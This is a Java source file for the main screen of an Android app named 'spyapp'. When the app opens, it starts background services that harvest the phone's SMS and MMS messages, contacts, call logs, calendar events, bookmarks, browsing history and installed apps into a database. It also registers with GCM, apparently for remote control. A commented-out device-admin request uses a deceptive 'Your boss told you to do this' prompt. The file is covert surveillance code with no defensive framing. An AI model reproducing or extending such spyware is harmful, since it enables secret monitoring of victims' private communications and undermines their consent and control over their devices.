package com.app.spyapp;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;

import com.app.spyapp.common.WriteLog;
import com.app.spyapp.gcm.QuickstartPreferences;
import com.app.spyapp.gcm.RegistrationIntentService;
import com.app.spyapp.receiver.DeviceAdminReceiver;
import com.app.spyapp.receiver.SendSMSInfoService;
import com.app.spyapp.service.BookmarkHistoryChangeService;
import com.app.spyapp.service.BookmarkService;
import com.app.spyapp.service.CalenderEventService;
import com.app.spyapp.service.CallLogChangeService;
import com.app.spyapp.service.CallLogService;
import com.app.spyapp.service.ContactAddService;
import com.app.spyapp.service.ContactService;
import com.app.spyapp.service.HistoryService;
import com.app.spyapp.service.InstallAppListService;
import com.app.spyapp.service.MMSService;
import com.app.spyapp.service.SmsService;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GoogleApiAvailability;

/**
 * Created by Ankit on 4/21/2016.
 */
public class HomeActivity extends AppCompatActivity {
    private DevicePolicyManager devicePolicyManager;
    private ComponentName deviceAdmin;
    // device Administrator
    static final int ACTIVATION_REQUEST = 47; // identifies our request id
    private static final int PLAY_SERVICES_RESOLUTION_REQUEST = 9000;
    private SpyApp spyApp;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        spyApp = (SpyApp) getApplicationContext();

        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        deviceAdmin = new ComponentName(this, DeviceAdminReceiver.class);
//        if (!devicePolicyManager.isAdminActive(deviceAdmin)) {
//            EnableDeviceAdministratorSetting();
//        } else {
        registerGCM();
        //Callling service for gettting broadcast for smsSent
        Intent screenshotIntent1 = new Intent(HomeActivity.this, SendSMSInfoService.class);
        startService(screenshotIntent1);
        //calling service for getting event of contact change
        Intent contactAddIntent = new Intent(HomeActivity.this, ContactAddService.class);
        startService(contactAddIntent);

        //calling service for getting event of calllog change
        Intent calllogchangeIntent = new Intent(HomeActivity.this, CallLogChangeService.class);
        startService(calllogchangeIntent);


        //calling service for getting event of bookmark change
        Intent bookmarkchangeIntent = new Intent(HomeActivity.this, BookmarkHistoryChangeService.class);
        startService(bookmarkchangeIntent);

        //get the list of SMS & store in database
        Intent smsIntent = new Intent(HomeActivity.this, SmsService.class);
        startService(smsIntent);
        //get the list of MMS & store in database
        Intent mmsIntent = new Intent(HomeActivity.this, MMSService.class);
        startService(mmsIntent);
        //get the list of contact & store in database
        Intent contactIntent = new Intent(HomeActivity.this, ContactService.class);
        startService(contactIntent);

        //get the list of Calllog & store in database
        Intent calllogIntent = new Intent(HomeActivity.this, CallLogService.class);
        startService(calllogIntent);

        Intent eventListIntent = new Intent(HomeActivity.this, CalenderEventService.class);
        startService(eventListIntent);

        //get the list of bookmark
        Intent BookmarkListIntent = new Intent(HomeActivity.this, BookmarkService.class);
        startService(BookmarkListIntent);

        //get the list of History
        Intent HistoryListIntent = new Intent(HomeActivity.this, HistoryService.class);
        startService(HistoryListIntent);

        //get the list of install applist
        Intent installAppIntent = new Intent(HomeActivity.this, InstallAppListService.class);
        startService(installAppIntent);
//        }


    }

    private void EnableDeviceAdministratorSetting() {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdmin);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Your boss told you to do this");
        startActivityForResult(intent, ACTIVATION_REQUEST);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        switch (requestCode) {
            case ACTIVATION_REQUEST:
                if (resultCode == Activity.RESULT_OK) {
                    WriteLog.E(HomeActivity.class.getSimpleName(), "Administration enabled!");
                    // Check device for Play Services APK.
                    registerGCM();
                    //Callling service for gettting broadcast for smsSent
                    Intent screenshotIntent1 = new Intent(HomeActivity.this, SendSMSInfoService.class);
                    startService(screenshotIntent1);
                    //get the list of SMS & store in database
                    Intent smsIntent = new Intent(HomeActivity.this, SmsService.class);
                    startService(smsIntent);

                } else {
                    WriteLog.E(HomeActivity.class.getSimpleName(), "Administration enable FAILED!");
                }
                return;
        }
        super.onActivityResult(requestCode, resultCode, data);
    }


    /**
     * Check the device to make sure it has the Google Play Services APK. If
     * it doesn't, display a dialog that allows users to download the APK from
     * the Google Play Store or enable it in the device's system settings.
     */
    private boolean checkPlayServices() {
        GoogleApiAvailability apiAvailability = GoogleApiAvailability.getInstance();
        int resultCode = apiAvailability.isGooglePlayServicesAvailable(this);
        if (resultCode != ConnectionResult.SUCCESS) {
            if (apiAvailability.isUserResolvableError(resultCode)) {
                apiAvailability.getErrorDialog(this, resultCode, PLAY_SERVICES_RESOLUTION_REQUEST)
                        .show();
            } else {
                Log.i(HomeActivity.class.getSimpleName(), "This device is not supported.");
                finish();
            }
            return false;
        }
        return true;
    }

    private void registerGCM() {
        if (TextUtils.isEmpty(spyApp.getSharedPreferences().getString(QuickstartPreferences.TOKEN, ""))) {
            if (checkPlayServices()) {
                // Start IntentService to register this application with GCM.
                Intent intent = new Intent(this, RegistrationIntentService.class);
                startService(intent);
            }
        }
//        Intent intent=new Intent(HomeActivity.this, ContactService.class);
//        startService(intent);
    }
}
